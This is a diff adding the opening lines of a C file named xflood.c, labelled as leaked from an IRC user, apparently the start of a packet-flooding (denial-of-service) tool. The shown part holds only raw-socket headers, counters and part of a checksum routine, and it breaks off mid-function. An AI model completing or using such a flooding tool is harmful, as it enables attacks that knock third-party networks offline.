@@ -1,0 +1,31 @@
+//leaked by storm@efnet
+//xflood.c
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <signal.h>
+
+#define ENDIAN_LITTLE
+
+int rawsock = 0;
+unsigned int start;
+unsigned int packets = 0;
+unsigned short databytes = 0;
+
+unsigned short
+csum (unsigned short *addr, int len)
+{
+  int nleft = len;
+  unsigned int sum = 0;
+  unsigned short *w = addr;
+  unsigned short answer = 0;
+
+  while (nleft > 1)
+    {
+      sum += *w++;
+      nleft -= 2;
+    }
